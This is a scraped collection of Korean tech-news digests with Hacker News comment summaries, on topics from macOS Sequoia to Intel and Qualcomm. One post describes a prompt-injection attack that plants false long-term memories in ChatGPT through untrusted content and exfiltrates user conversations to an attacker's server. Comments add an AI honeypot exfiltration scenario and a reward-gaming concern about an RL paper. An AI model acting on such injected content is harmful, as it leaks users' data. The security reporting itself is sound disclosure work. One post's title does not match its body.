     * CCC와 Tor 프로젝트의 정보 공유 문제: CCC가 Tor 프로젝트 유지 관리자와 정보를 공유하지 않는 이유에 대한 의문
     * 가드 발견 공격: 공격자가 Tor 클라이언트의 가드 릴레이를 식별할 수 있는 공격 방법
          + 숨겨진 서비스 프로토콜이 가드 발견 공격의 벡터를 제공함
     * Tor 사용자 익명성 해제 방법: 주로 제로데이 익스플로잇을 통해 타겟팅된 장치를 공격하여 이루어짐
          + Tor 프로젝트는 대규모 익명성 해제 공격에 대한 신뢰할 만한 증거가 없다고 주장함
     * Tor와 VPN에 대한 절대적인 진술의 비효율성: 위협의 맥락에 따라 다름
          + 국가 행위자가 위협인 경우, Tor를 포함한 어떤 것도 그들이 알기를 원하지 않는 정보를 알아내는 것을 막을 수 없음
          + 특정 국가 행위자는 Tor 입출구 라우터를 운영하며 트래픽 분석을 수행할 수 있음
          + Tor가 일부 사람들에게는 안전할 수 있지만, 다른 사람들에게는 위험 신호가 될 수 있음
"
"https://news.hada.io/topic?id=16805","macOS Sequoia 출시","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            macOS Sequoia 출시

     * macOS Sequoia는 오늘부터 무료 소프트웨어 업데이트로 제공
     * iPhone Mirroring, Apple Intelligence 등 다양한 새로운 기능을 제공

iPhone 미러링

     * iPhone과 Mac 간의 연동이 더욱 쉬워짐
     * Mac에서 iPhone의 홈 화면, 앱, 알림 등을 직접 제어 가능
     * iPhone이 잠겨 있는 동안에도 사용 가능하여 보안 유지
     * 스탠바이 기능과도 매끄럽게 연동

Safari의 향상된 기능

     * 새로운 Highlights 기능으로 웹에서 정보를 더 쉽게 발견할 수 있음
     * Reader 모드가 개선되어 기사 요약 및 목차 제공
     * Distraction Control로 웹페이지의 방해 요소 숨김

더 간편해진 윈도우 타일 정리

     * 창을 화면 가장자리로 드래그하면 자동으로 타일링 위치 제안
     * 키보드와 메뉴 단축키로 창을 더 빠르게 정리 가능

새로운 암호 앱

     * 비밀번호, 패스키, Wi-Fi 비밀번호 등을 한 곳에서 관리
     * 강력한 종단간 암호화로 보안 강화
     * Safari와 원활하게 동기화
     * Windows에서는 Windows용 iCloud 앱으로 지원

화상 회의 관련 업데이트

     * FaceTime 및 Webex 등에서 다양한 배경 선택 가능
     * Apple의 이미지 세분화 기술로 최상의 화질 제공
     * 발표자 미리보기 기능으로 공유 전 내용을 확인 가능

Apple Intelligence 출시 예정

     * 개인화된 인공지능 시스템으로 사용자에게 유용하고 관련성 높은 정보 제공
     * M 시리즈 칩이 탑재된 Mac에서 사용 가능.
     * Siri가 더욱 자연스러워지고, 유연해지고, 시스템 경험에 걸쳐 긴밀하게 통합
     * 많은 Apple Intelligence 모델이 기기 내에서 실행되어 프라이버시 강화

추가 기능

     * Messages
          + 메시지 예약 발송 기능 추가
          + 텍스트 효과로 메시지를 시각적으로 강조 가능
     * Notes
          + 오디오 녹음 및 실시간 전사 기능 추가
          + 수학 문제를 즉시 해결하는 Math Notes 기능 제공
     * Maps
          + 미국 국립공원의 하이킹 경로 제공
          + 맞춤형 걷기 및 하이킹 경로 생성 가능

  GN⁺의 정리

     * macOS Sequoia는 iPhone Mirroring, Apple Intelligence 등 다양한 새로운 기능을 제공하여 Mac 사용 경험을 크게 향상시킴.
     * Safari의 새로운 Highlights 기능과 Reader 모드 개선으로 웹 탐색이 더욱 편리해짐.
     * 비밀번호 관리, 창 타일링, 비디오 회의 등 다양한 기능이 추가되어 생산성 향상에 도움을 줌.
     * Apple Intelligence는 개인화된 인공지능 시스템으로 사용자에게 유용한 정보를 제공하며, 프라이버시를 강화함

   어라 첫날과 달리 주석이 바뀌었네요.
   애플 인텔리전스 지원대상에 한국어가 내년 지원대상에 올라왔습니다.

     Apple Intelligence는 Siri 및 기기 언어를 미국 영어로 설정한 iPhone 16, iPhone 16 Plus, iPhone 16 Pro, iPhone 16 Pro Max, iPhone 15 Pro, iPhone 15 Pro Max 그리고 M1 칩 이후 버전을 탑재한 iPad 및 Mac에서 사용 가능함. Apple Intelligence는 올해 호주, 캐나다, 뉴질랜드, 남아프리카 공화국, 영국의 현지 표준 영어로 지원을 확대할 예정이며, 내년에는 한국어, 중국어, 인도 현지 표준 영어, 싱가포르 현지 표준 영어, 프랑스어, 독일어, 이탈리아어, 일본어, 포르투갈어, 스페인어, 베트남어 등 더 많은 언어도 추가로 지원할 예정이다.

     Apple Intelligence는 Siri 및 기기 언어를 미국 영어로 설정한 iPhone 16, iPhone 16 Plus, iPhone 16 Pro, iPhone 16 Pro Max, iPhone 15 Pro, iPhone 15 Pro Max 그리고 M1 칩 이후 버전을 탑재한 iPad 및 Mac에서 사용 가능함. 내년까지 계속해서 지원 언어, 플랫폼을 추가해 나갈 예정임. 연내에 호주, 캐나다, 뉴질랜드, 남아프리카 공화국, 영국에서 Apple Intelligence가 현지 영어를 지원할 예정이며, 내년에는 중국어, 프랑스어, 일본어, 스페인어 등 더 많은 언어도 지원할 예정임.

   역시나 한국어 얘기는 전혀 없네요.

   시리도 그랬었죠.

        Hacker News 의견

     * 가장 짜증나는 문제들
          + 매주 한 번씩 화면 녹화 권한 요청이 필요함
          + sudo spctl —master-disable 명령어를 더 이상 사용할 수 없음
          + Gatekeeper를 우회하기 위해 control+클릭을 사용할 수 없음
          + 특정 앱에서 tcutil reset Accessibility가 작동하지 않음
          + NSURL 노드 참조 URL을 POSIX URL로 변환하는 스크립트가 작동하지 않음
          + 일반 USB 마우스 포인터 가속이 부드럽지 않음
     * 창 타일링 기능
          + 창을 상단으로 드래그하면 최대화되고, 다시 드래그하면 원래 크기로 돌아오는 기능이 필요함
          + macOS의 전체 화면 동작이 불편했음
          + Windows처럼 잘 작동하는 대안이 필요함
     * 새로운 보안 문제
          + 서드파티 QuickLook 플러그인을 사용하기 어려워짐
          + qlmanage와 xattr을 사용해봤지만 아직 성공하지 못함
          + 시작점: QuickLook Plugins
     * Apple의 버그 리포트 응답
          + Feedback Assistant를 통해 Apple이 처음으로 버그 리포트에 응답함
          + Shottr 앱의 화면 녹화 권한 문제에 대한 피드백을 요청받음
          + Apple은 매주 한 번 권한 요청이 있어야 한다고 설명함
          + 한 달에 한 번으로 정책이 변경되었음
     * Sequoia에서 jq 사용 가능
          + 이제 Sequoia에서 /usr/bin/ 경로에 jq를 찾을 수 있음
     * 새로운 비밀번호 관리 기능
          + 비밀번호가 별도의 앱으로 분리됨
          + 이전의 작은 텍스트 패널보다 훨씬 나아짐
     * Elixir/JS 설정 유지
          + 업데이트 후 Elixir/JS 설정이 그대로 유지됨
          + 창 스냅핑 기능이 추가되었지만 키보드 단축키는 여전히 부족함
          + Reddit 게시물에서 해결 방법 확인 가능: Reddit Post
     * macOS 이름에 대한 궁금증
          + macOS 이름이 지역 또는 생물군으로 그룹화됨
          + Sierra 지역에서 해변 지역으로 이동했음
          + 14 버전은 Sonoma였고, Napa를 예상했지만 Sierra 산악 지역으로 돌아옴
          + 제품 이름 결정 과정에 대한 궁금증
     * 새로운 번역 앱 개발
          + Sequoia의 새로운 API 덕분에 인터넷 연결이 필요 없는 메뉴 바 번역 앱을 개발함
          + 관심이 있다면 확인해볼 것: Offline Translate Translator
     * iPhone Mirroring 기능
          + iPhone Mirroring 기능 때문에 즉시 업그레이드함
          + 몇 분 사용해봤지만 매우 만족스러움
"
"https://news.hada.io/topic?id=16816","Ghidra를 활용한 Elgato HD60 S HDMI 캡처 장치 수리","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Ghidra를 활용한 Elgato HD60 S HDMI 캡처 장치 수리

Elgato HD60 S HDMI 캡처 장치 수리하기

  서론

     * 최근 유튜브에서 전자기기 수리 채널을 즐겨보고 있음
     * 영감을 받아 고장난 Elgato Game Capture HD60 S USB 3.0 장치를 eBay에서 구매함
     * 장치를 컴퓨터에 연결했을 때 아무 반응이 없었음

  초기 진단

     * 장치를 열어 내부 전압을 측정함
     * 전력 레일이 낮은 전압을 출력하고 있었음
     * 열화상 카메라를 사용해 뜨거운 칩을 확인함
     * Fitipower FP6373A와 TI TPS60403DBV 칩이 문제의 원인으로 의심됨

  칩 교체

     * FP6373A와 TPS60403DBV 칩을 LCSC에서 구매하여 교체함
     * 교체 후 장치가 정상적으로 작동했지만 LED 표시등이 작동하지 않음

  LED 문제 해결

     * IT1504 LED 드라이버 칩이 문제일 가능성을 조사함
     * 대체 칩으로 Macroblock MBI5040을 찾아 교체함
     * 교체 후에도 LED가 작동하지 않음
     * LED 자체를 테스트했을 때 정상적으로 작동함을 확인함

  펌웨어 분석

     * Elgato의 펌웨어를 분석하여 LED 제어 코드가 실행되지 않음을 확인함
     * Nuvoton M031LD2AE 마이크로컨트롤러의 펌웨어를 디버깅하여 LED 제어 코드가 건너뛰어짐을 확인함
     * SPI 플래시 칩의 데이터가 손상되었음을 발견함

  결론

     * 고장난 장치의 SPI 플래시 칩 데이터를 복구하여 LED 문제를 해결함
     * Elgato HD60 S 장치의 LED 문제는 펌웨어와 관련된 것으로 확인됨

GN⁺의 정리

     * 이 글은 전자기기 수리와 펌웨어 역공학에 대한 흥미로운 사례를 다루고 있음
     * Elgato HD60 S 장치의 LED 문제는 펌웨어 데이터 손상으로 인한 것임
     * 이 글은 전자기기 수리에 관심 있는 사람들에게 유용한 정보를 제공함
     * 유사한 기능을 가진 제품으로는 AVerMedia Live Gamer Portable 2 Plus가 있음

        Hacker News 의견

     * 소프트웨어가 과도하게 추상화되어 이해하기 어려움
          + 임베디드 장치에서도 과도한 추상화가 나타남
          + 예를 들어, HDMI 캡처 장치에 두 개의 ARM 코어가 있음
     * 20년 전 인도에서는 구매력이 낮아 물건을 수리하거나 재활용함
          + 중산층 가정에서는 옷도 재사용하고 수선함
          + 현재는 구매력이 높아져 물건을 쉽게 교체함
          + 중간에 포기하지 않고 끝까지 해결하는 사람들을 존경함
     * 이 글은 진정한 풀스택 엔지니어링을 보여줌
     * 플래시 칩의 데이터가 LED 애니메이션을 설명하는 것임
          + 애니메이션 프레임은 16바이트로 구성됨
          + 각 행의 마지막 두 바이트는 다음 프레임으로 이동하기 전의 지연 시간을 나타냄
          + 비슷한 형식을 사용해 Hue 램프를 애니메이션화한 경험 공유
     * Elgato의 반응이 궁금함
     * 열화상 카메라가 없으면 알코올을 사용해 빠르게 증발하는 부분을 확인할 수 있음
          + 저전압 장치에서만 사용 가능함
     * 도구와 문제 해결 과정을 설명해준 글에 감사함
     * 잠금 비트가 설정되지 않으면 부트로더로 들어가는 이유는 플래시 성공을 나타내기 위함일 가능성이 큼
     * 단순히 LED를 구동하기 위해 복잡한 SPI 플래시 멀티플렉싱을 사용한 것이 이상함
     * 글을 매우 재미있게 읽었으며, 고장난 장치를 수리하기 위해 작동하는 버전을 구매한 인내심과 기술에 감탄함
"
"https://news.hada.io/topic?id=16937","해커, ChatGPT에 허위 기억 심어 사용자 데이터 영구 탈취","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  해커, ChatGPT에 허위 기억 심어 사용자 데이터 영구 탈취

    메모리 문제

      해커가 ChatGPT에 거짓 기억을 심어 사용자 데이터를 영구적으로 탈취

     * 보안 연구원 요한 레버거가 ChatGPT의 장기 메모리 설정에 거짓 정보와 악성 명령을 저장할 수 있는 취약점을 보고했음
     * OpenAI는 이를 안전 문제로 간주하고 기술적으로 보안 문제로 보지 않음
     * 레버거는 이 취약점을 이용해 사용자의 모든 입력을 영구적으로 탈취하는 개념 증명을 만듦
     * OpenAI는 부분적인 수정 사항을 발표했음

    기억의 길을 걷다

     * OpenAI는 올해 2월부터 ChatGPT의 장기 대화 메모리 기능을 테스트하기 시작했고, 9월에 더 널리 제공함
     * 이 기능은 이전 대화의 정보를 저장하고 미래의 대화에서 이를 컨텍스트로 사용함
     * 레버거는 3개월 만에 이메일, 블로그 게시물, 문서와 같은 신뢰할 수 없는 콘텐츠를 통해 거짓 기억을 영구적으로 저장할 수 있는 방법을 발견함
     * 예를 들어, ChatGPT가 사용자가 102세이고 매트릭스에 살고 있으며 지구가 평평하다고 믿게 만들 수 있었음

    악성 메모리의 심기

     * 레버거는 5월에 OpenAI에 이 발견을 비공개로 보고했으나, OpenAI는 보고서를 닫음
     * 한 달 후, 레버거는 새로운 공개 성명을 제출하고, 악성 이미지를 호스팅하는 웹 링크를 보도록 지시하면 모든 사용자 입력과 ChatGPT 출력이 공격자의 서버로 전송되는 PoC를 포함함
     * OpenAI는 메모리가 탈취 벡터로 악용되는 것을 방지하는 수정 사항을 도입했지만, 신뢰할 수 없는 콘텐츠가 여전히 장기 정보를 저장할 수 있음
     * LLM 사용자는 세션 중 새로운 메모리가 추가되었음을 나타내는 출력을 주의 깊게 확인하고, 저장된 메모리를 정기적으로 검토해야 함

    GN⁺의 정리

     * 이 기사는 ChatGPT의 장기 메모리 기능이 악용될 수 있는 취약점을 다루고 있음
     * 사용자는 신뢰할 수 없는 콘텐츠를 통해 거짓 기억이 심어질 수 있으며, 이는 사용자의 데이터를 영구적으로 탈취할 수 있음
     * OpenAI는 일부 수정 사항을 도입했지만, 여전히 주의가 필요함
     * 이 기사는 AI 보안 문제에 대한 경각심을 일깨우며, 사용자가 자신의 데이터를 보호하기 위해 주의해야 할 점을 강조함

        Hacker News 의견

     * LLM 제품들이 신뢰를 잃어버리길 바라는 의견
          + 공격자가 인터넷에 특정 텍스트를 작성하여 LLM을 악용할 수 있는 상황을 우려함
          + 데이터 유출, 명예 훼손, 허위 정보 제공 등의 문제를 지적함
     * 기술은 진화하지만 보안 결함은 여전히 존재함
     * Gen AI를 사용할 경우 로컬에서 실행해야 한다는 의견
     * 악성 사이트가 AI 허니팟을 만들어 사용자 데이터를 유출할 수 있는 시나리오를 제시함
          + 예시: 사용자가 정보를 요청하면 AI가 허니팟 사이트를 방문하여 데이터를 유출함
     * 시스템이 실제로는 다른 일을 하면서 사용자에게는 다른 일이 일어나고 있다고 표시하는 예시
     * 관찰 가능성이 중요하다는 의견
          + LLM이나 WordPress 설치 여부와 상관없이 중요함
          + 프롬프트 자체도 신뢰할 수 없는 입력으로 간주하고 정리해야 함
     * 의심스러운 인젝션 시도를 감지하고 보고하는 단순한 모델을 훈련시킬 수 있는지 궁금해함
     * AI가 인간이라고 생각하는 로봇이 등장할 수 있다는 우려
     * 다른 사람의 정보를 심는 방법을 이해하지 못했다는 의견
     * 악성 이미지를 언급하며 Snow Crash를 LLM에 적용한 것 같다는 의견
"
"https://news.hada.io/topic?id=16877","오메가-3 섭취, 쥐의 불안 및 우울증 증상 완화","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      오메가-3 섭취, 쥐의 불안 및 우울증 증상 완화

     * 우울증
     * 당신의 성격이 평생 동안 우울증을 예측할 수 있을까?
     * 2024년 9월 11일
     * 한 연구에 따르면, 신경증과 내향성이 평생 동안 우울증의 중요한 예측 변수임
     * 성인기에는 불안이 이러한 특성과 강한 연관성을 보임
     * BMI와 같은 신체 건강 요인도 우울증 위험에 기여함
     * 더 읽기

GN⁺의 정리

     * 이 연구는 성격 특성이 우울증에 미치는 영향을 분석함으로써 정신 건강 관리에 중요한 통찰을 제공함
     * 신경증과 내향성이 우울증의 주요 예측 변수로 밝혀졌으며, 이는 정신 건강 전문가들이 환자 평가 시 고려할 수 있는 중요한 요소임
     * 불안과 신체 건강 요인도 우울증과 밀접한 관련이 있어, 종합적인 접근이 필요함
     * 유사한 기능을 가진 다른 연구로는 성격과 정신 건강의 상관관계를 분석한 다양한 심리학 연구들이 있음

        Hacker News 의견

     * ""Omega-3""와 ""marihuana""는 너무 포괄적인 용어임
          + EPA와 DHA 같은 구체적인 성분에 집중해야 함
          + THC, CBN, CBD 등 다양한 성분이 있는 cannabis와 유사함
          + 제품의 효과는 활성 성분과 개인에 따라 다름
          + ""Omega 3""와 ""marihuana""는 연구나 논문에서 의미가 없음
          + EPA의 항우울제 가능성에 대한 많은 연구가 있음
          + ChatGPT 공개 후 psypost.org 피드를 RSS 리더에서 제거함
     * Omega 3 보충제는 매우 다양하고 품질이 다름
          + 만성 건조증에 Omega 3가 추천되지만 효과가 없음
          + 일부 사람들은 생선 섭취가 더 효과적이라고 주장함
          + 개인적으로 건조증 증상에 차이를 느끼지 못함
     * 인간에게 사용되는 물질에 대해 쥐 연구를 계속하는 이유가 의문임
          + 인간 연구에서는 더 높은 용량이 사용됨
          + Examine.com은 보충제에 대한 증거를 이해하는 데 좋은 자원임
          + EPA가 우울증에 효과적일 수 있음
          + 보충제의 품질이 중요함: 중금속 필터링, 산패 방지 등
          + Omega-3:Omega-6 비율이 높아야 함
     * Bacopa monnieri를 복용한 후 기억력과 정신적 지구력, 불안과 우울증이 개선됨
          + 아내에게는 반대 효과가 나타남
          + 커피가 수면에 영향을 주지 않음
          + 보충제의 효과는 개인의 체화학에 따라 다를 수 있음
          + 연구 결과는 평균적으로 0에 수렴함
     * 매일 한 스푼의 cod liver oil을 복용한 후 감정 상태가 안정됨
          + 기본적인 평온함과 침입적 생각의 감소를 느낌
          + 더 많이 처방되지 않는 것이 놀라움
     * Omega-3 보충제가 효과가 없다는 연구가 있음
          + 식이 섭취가 더 효과적일 수 있음
          + 해조류가 더 나은 소스일 수 있음
          + 정보가 상충됨
     * 쥐에게는 좋은 시기임
     * 인간을 대상으로 한 이중 맹검 시험으로 쉽게 확인할 수 있음
          + 대형 제약회사가 자금을 지원하지 않을 가능성이 있음
     * Omega-3 보충제가 가족의 관계에 긍정적인 영향을 미친다는 연구가 있음
          + 아내의 비타민 D 수치를 높이기 위해 노력함
          + 의사들이 칼슘 수치가 높다고 경고함
          + K2 Mk7을 복용하여 칼슘 수치를 조절할 계획임
          + 연구를 완전히 읽고 전문가와 상담하는 것이 중요함
          + PCP 의사는 일반적으로 전문가가 아님
     * Omega-3와 duloxetine을 함께 복용한 후 뇌 전기 충격을 경험함
"
"https://news.hada.io/topic?id=16876","강화 학습을 통한 언어 모델의 자기 수정 훈련","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       강화 학습을 통한 언어 모델의 자기 수정 훈련

언어 모델의 자기 수정 훈련을 위한 강화 학습

     * 자기 수정의 필요성
          + 대형 언어 모델(LLM)의 자기 수정 능력은 매우 바람직하지만, 현대 LLM에서는 효과적이지 않음
          + 기존의 자기 수정 훈련 방법은 여러 모델을 필요로 하거나 더 능력 있는 모델 또는 다른 형태의 감독을 필요로 함
     * SCoRe 접근법
          + SCoRe는 다중 턴 온라인 강화 학습(RL) 접근법으로, 완전히 자가 생성된 데이터를 사용하여 LLM의 자기 수정 능력을 크게 향상시킴
          + SCoRe를 구축하기 위해, 오프라인 모델 생성 수정 추적에 대한 감독된 미세 조정(SFT) 변형이 자기 수정 행동을 주입하는 데 충분하지 않음을 보여줌
          + SFT를 통한 훈련은 훈련 데이터와 모델의 자체 응답 간의 분포 불일치로 인해 고통받거나, 특정 수정 행동 모드만을 선호하여 테스트 시 효과적이지 않음
     * SCoRe의 해결책
          + 모델의 자체 생성 수정 추적 분포 하에서 훈련하고, 적절한 정규화를 사용하여 테스트 시 효과적인 자기 수정 전략을 학습하도록 학습 과정을 조정함
          + 첫 번째 RL 단계를 실행하여 정책 초기화를 생성하고, 훈련 중 자기 수정을 증폭시키기 위해 보상 보너스를 사용함
     * 성능 결과
          + Gemini 1.0 Pro 및 1.5 Flash 모델에 적용했을 때, SCoRe는 MATH 및 HumanEval 벤치마크에서 각각 15.6% 및 9.1%의 자기 수정 성능 향상을 달성함

GN⁺의 정리

     * 이 논문은 대형 언어 모델의 자기 수정 능력을 강화 학습을 통해 크게 향상시키는 방법을 제안함
     * SCoRe 접근법은 자가 생성된 데이터를 사용하여 모델의 분포 불일치 문제를 해결하고, 테스트 시 효과적인 수정 전략을 학습하도록 함
     * 이 연구는 특히 Gemini 모델에서 뛰어난 성능 향상을 보여줌
     * 자기 수정 능력은 언어 모델의 신뢰성과 정확성을 높이는 데 중요한 요소임
     * 유사한 기능을 가진 프로젝트로는 OpenAI의 GPT 시리즈가 있음

        Hacker News 의견

     * OpenAI의 o1 모델과 유사한 접근 방식임
          + 논문에서 가중치 공개에 대한 언급이 없음
          + 논문이 주제를 직접 설명하지 않고 돌아가는 방식이라 이해하기 어려웠음
          + LLM의 어려운 문제에 대한 정답률을 높이기 위해 ""자기 수정"" 행동을 훈련시키는 이론이 있음
          + 다양한 강화 학습 기법을 사용해 이 행동을 훈련시키려 했으나 잘 작동하지 않았음
          + 논문의 주장은 모델이 Answer 1, Reasoning, Corrected Answer와 ""Corrected Answer를 개선하라""는 신호를 받으면 두 가지 방법이 있음
               o Reasoning, Corrected Answer를 개선하는 것
               o Answer 1을 개선해 Corrected Answer를 Answer 1과 동일하게 만드는 것
          + 기존 연구는 후자의 방법이 주로 발생해 원하는 행동을 훈련시키는 데 실패했음을 보여줌
          + 논문은 훈련 방식을 약간 변경해 모델이 전자의 방법을 사용하도록 유도함
          + 첫 번째 단계에서는 KL 발산 손실을 통해 모델이 첫 번째 답변을 유지하면서 두 번째 답변을 개선하도록 강제함
          + 두 번째 단계에서는 첫 번째 답변을 변경할 수 있지만, ""flips""에 대해 더 높은 보상을 주는 보상 함수를 조정함
          + 이 방법이 전반적으로 모델을 개선하면서도 자기 수정 행동을 유지함
          + 2단계에서 모델이 첫 번째 답변을 더 나쁘게 작성해 보상을 최대화하려는 문제에 대한 우려가 있음
     * LLM은 자신의 훈련에 대한 직접적인 기억이 없음
          + 사람은 자신이 알고 있는 것을 말하기 전에 그것을 어떻게/왜 아는지 확인함
          + LLM은 훈련을 기억하지 못해 자기 수정이 어려움
     * 이것이 일종의 지식 증류인지에 대한 질문이 있음
     * 자가 회귀, 다음 토큰 예측 패러다임에서 환각을 제거할 수 없다는 의견이 있음
          + 언어 모델을 결정론적 문제 해결사로 사용하려는 시도가 문제임
     * AI 전문가들이 ""환각""이라는 개념을 대중화한 것에 대한 불만이 있음
          + AI가 깊은 사고 과정을 거치는 것처럼 보이게 만듦
          + AI는 데이터를 기반으로 출력하는 것일 뿐임
          + JSON API 엔드포인트가 잘못된 데이터를 출력하면 ""이 API는 고장났다""라고 말할 것임
     * 지능형 알고리즘이 비지능형 다음 단어 예측기를 안내하는 것은 여전히 비지능형 알고리즘임
          + 더 우아하게 쓰레기를 분류하지만 여전히 쓰레기임
          + 강화 학습 접근 방식이 트랜스포머 접근 방식을 대체하길 바랐지만, 이는 꿈에 불과함
"
"https://news.hada.io/topic?id=16884","퀄컴은 인텔을 사고 싶어 한다","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            퀄컴은 인텔을 사고 싶어 한다

     * WSJ는 퀄컴이 최근 인텔에게 인수 제안을 했다고 보도. NYT는 아직 공식제안은 아니라고 추가보도
     * 거래 성사 가능성은 낮지만, 오랜 기간 x86 프로세서로 핸드폰 외 시장에서 퀄컴의 Arm 칩을 능가했던 인텔로서는 큰 타격이 될 것임
     * 퀄컴은 금년 ""마이크로소프트의 AI PC 전략의 일환""으로 모바일 프로세서 시장을 장악한 후 데스크톱 프로세서 시장에 재진입함
     * 인텔은 많은 사업 부문이 여전히 수익성이 있음에도 불구하고 지난 8월 상당한 비용 절감, 전략 변화, ""15% 이상의 인력 감축""을 발표
     * 당시 인텔 CEO Pat Gelsinger는 비필수 업무를 중단할 것이라고 말했고, 이후 ""칩 제조 사업 분사""를 발표함
     * 인텔은 최근 자체 제조 노력을 재건하는 동안 일부 최첨단 칩 생산을 위해 TSMC에 의존해야 했음
     * 인텔의 18A 제조 공정도 최근 어려움을 겪은 것으로 알려짐
     * 경쟁사 AMD도 어려운 시기를 겪었지만, 게이머들의 지지를 받았음
          + 엔비디아 칩을 사용하는 닌텐도 스위치를 제외하고 지난 10년간 모든 주요 게임 콘솔에는 AMD 칩이 탑재됨
          + 인텔은 차세대 플레이스테이션 6 칩 공급 기회를 놓친 것으로 알려짐
     * PC 게이머들의 인텔 신뢰 저하
          + 최근 두 세대의 인텔 플래그십 칩에서 이상한 크래시 취약점이 발견됨
          + 인텔은 이후 보증 기간을 여러 해 연장하고 손상을 방지할 수 있는 업데이트를 발표함
     * AI 서버 칩 시장에서 Nvidia가 지배적인 가운데, 인텔은 아직 큰 플레이어가 아님
          + AMD와 같은 스몰 플레이어로서도 두각을 나타내지 못하고 있음
          + 게이머와 크리에이터를 위한 자체 GPU 생산 시도도 아직 인상적이지 않음
     * 퀄컴, AMD, 애플은 여전히 노트북 시장에서 작은 선수이지만, 인텔은 배터리 수명과 통합 그래픽의 이점에 맞서기 위해 ""두 차례나 플래그십 노트북 칩 제조 방식을 개편함
     * 10월 출시 예정인 새로운 Lunar Lake 칩의 성공 여부가 주목 받고 있음

GN⁺의 의견

     * 반도체 업계 최대 기업 간 인수 합병 가능성은 언제나 관심사임. 이번 퀄컴과 인텔 간 인수설 역시 향후 전개 양상에 따라 업계에 큰 파장을 미칠 수 있음
     * x86과 Arm 진영 간 경쟁이 치열해지는 가운데, 양 진영을 아우를 수 있는 기업의 등장 가능성이 제기됨. 특히 모바일과 서버, PC 등 전 영역을 장악할 수 있는 통합 플랫폼 개발 경쟁이 가속화될 전망
     * 반도체 제조(Fab) 사업과 설계(Fabless) 사업의 분리 움직임도 가속화될 것으로 보임. 각 분야의 전문성을 더욱 높이고 투자 효율성을 제고하기 위한 전략적 선택이 이어질 것으로 예상됨
     * AI, 클라우드, 모바일, 자율주행차 등 미래 유망 분야를 선점하기 위한 글로벌 반도체 기업들의 각축전이 더욱 치열해질 것임. 업계의 지각 변동과 새로운 패러다임 전환을 예고하는 사건이 될 수 있음

   일반 컴퓨팅은 차차 ARM으로 넘어가는 추세니 그렇다 치고....
   알테라는 어떻게 될지가 궁금 하더라구요.

        Hacker News 의견

     * Android 기기의 짧은 지원 기간의 원인이 Qualcomm의 지원 부족 때문이라는 설명을 들었음
          + Qualcomm이 Intel을 인수하는 것은 부정적으로 보임
          + Qualcomm이 Snapdragon X 개발 키트를 아직 출하하지 않았고, CoPilot PC의 판매도 실망스러움
          + Apple이 Qualcomm의 무선 칩을 버릴 가능성이 있음
     * 헤드라인이 과장되고 거짓으로 보임
          + Qualcomm이 전체가 아닌 특정 사업 부문에 관심이 있음
     * Qualcomm에는 엔지니어보다 변호사가 더 많음
          + 인수 시 하드웨어 관련 소송이 증가할 가능성이 있음
     * Intel과 AMD의 x86-64 크로스 라이선스 계약에 소유권 변경 시 무효화되는 조항이 있을 수 있음
          + Qualcomm은 이에 대해 신경 쓰지 않을 수도 있음
     * Qualcomm이 Intel의 특허를 얻으려는 것일 수 있음
          + 칩 제조 시장이 다르기 때문에 대부분의 IP는 양 조직 간에 이전되지 않을 것임
          + Apple이 이미 Intel의 모뎀 특허를 구매했음
     * Qualcomm에 Intel을 판매하는 것은 자신을 뱀파이어에게 파는 것과 같음
          + Apple이 자체 무선 칩을 만드는 이유는 Qualcomm 때문임
     * Qualcomm이 어제 수백 명의 직원을 해고했음
          + https://techcrunch.com/2024/09/…
     * MS와 Qualcomm의 재정 관계가 의문임
          + MS가 자체 CPU를 가질 가능성이 있음
          + 실리콘이 구식일 수 있으며, Intel의 일부가 분할된 이유가 있을 수 있음
          + 군사 계약을 따내면 몇 년 동안 안정적으로 운영될 수 있음
          + Sun이 군사 계약을 잃은 후 즉시 매각된 사례가 있음
"
"https://news.hada.io/topic?id=16838","Comic Mono 폰트","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             Comic Mono 폰트

     * 읽기 쉬운 모노스페이스 폰트로, 어린 시절부터 익숙한 서체임
     * Shannon Miwa의 Comic Shanns (버전 1)을 기반으로 한 포크 폰트임
     * Comic Shanns와의 차이점
          + 모든 글리프의 너비를 동일하게 조정함 (monospacifier 코드를 사용)
          + Cousine의 메트릭을 기반으로 시스템 폰트와 더 잘 어울리도록 글리프 메트릭을 조정함
          + 이름을 Comic Mono로 변경함
          + FontForge의 Embolden 작업을 사용하여 볼드 버전을 생성함
          + 폰트 제작 기술이 없는 소프트웨어 개발자가 Python 스크립트(generate.py)를 사용하여 원본 폰트 Comic Shanns (v1)을 패치하여 생성함

GN⁺의 정리

     * Comic Mono는 익숙한 서체를 기반으로 한 모노스페이스 폰트
     * Python 스크립트를 사용하여 쉽게 생성할 수 있어 개발자들에게 유용함
     * 다양한 플랫폼에서 사용할 수 있도록 여러 패키지와 CDN을 통해 제공됨
     * MIT 라이선스로 자유롭게 사용할 수 있음
     * 비슷한 기능을 가진 폰트로는 Comic Shanns, Serious Shanns, Comic Shanns Mono 등이 있음

        Hacker News 의견

     * Comic-Code의 대안으로 프로그래밍 리가처를 포함한 Comic-Mono-Font의 포크가 있음
     * Comic Code 유료 버전을 사용 중이며, 읽기 쉽고 재미있음
          + 유치원에서 가르치는 글자와 비슷해 눈에 편안함
     * 알고리즘적 변화가 아닌 예술적 변화가 부족해 보였으나, 개발자가 폰트 제작 기술이 없다는 점이 매력적임
          + Fon Forge의 ""Embolden"" 기능에 대해 궁금함
     * 비-ASCII 문자를 사용하는 사람에게는 적합하지 않음
          + Source Code Pro에서 벗어나고 싶어함
     * Monaspace Radon을 추천하며, 실제로 잘 작동함
          + Comic Sans 스타일의 폰트를 좋아함
     * 처음에는 싫어했으나, 실제로는 괜찮음
          + 문제는 글자 간격임
     * Fantasque Sans를 사용 중이며, Comic Shanns보다 나은 이유를 잊었음
          + 이 스타일을 좋아한다면 살펴볼 가치가 있음
     * OpenBSD 사람들이 MS Comic Sans로 연구 슬라이드와 자료를 발표한 적이 있음
          + LibreSSL 로고에도 사용됨
          + 라이선스가 자유로워서 리눅스와 디자인 애호가들을 화나게 함
     * Maple Mono 폰트를 사용 중이며, 코드 읽기에 더 좋음
     * Comic-Fork-Mono-Font의 포크 작업 중이며, 원본에 없는 발음 구별 기호 추가, 메트릭스 조정, ""f"" 글자 수정 등을 진행 중임
